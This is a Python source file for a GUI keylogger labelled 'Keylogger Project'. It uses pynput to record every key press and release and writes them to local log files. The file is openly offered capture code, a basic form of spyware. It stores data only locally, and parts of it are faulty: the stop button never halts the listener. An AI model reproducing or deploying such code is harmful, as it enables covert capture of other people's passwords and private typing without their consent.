import tkinter as tk
from tkinter import *
import threading
import json
from pynput import keyboard

root = tk.Tk()
root.geometry("900x600")
root.title("Keylogger Project")
root.configure(bg="black")

key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
    x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
        update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
        update_json_file(key_list)
        key_strokes = key_strokes + str(key)
        update_txt_file(str(key_strokes))

def start_keylogger():
    print("[+] Running Keylogger successfully!\n[!] Saving the key logs in 'logs.json'")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def start_keylogger_thread():
    global key_list, x, key_strokes
    key_list = []
    x = False
    key_strokes = ""
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

def stop_keylogger():
    global x
    x = False

def save_logs():
    with open('key_logs.txt', 'w') as file:
        file.write(str(key_strokes))

def clear_logs():
    global key_strokes
    key_strokes = ""
    output_text.delete(1.0, tk.END)

output_frame = Frame(root, bg="black")
output_frame.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)

output_text = Text(output_frame, bg="black", fg="white", font="Verdana 10", wrap="word")
output_text.pack(fill=tk.BOTH, expand=True)

Button(root, text="Start Keylogger", command=start_keylogger_thread).pack(pady=5)
Button(root, text="Stop Keylogger", command=stop_keylogger).pack(pady=5)
Button(root, text="Save Logs", command=save_logs).pack(pady=5)
Button(root, text="Clear Logs", command=clear_logs).pack(pady=5)

root.mainloop()



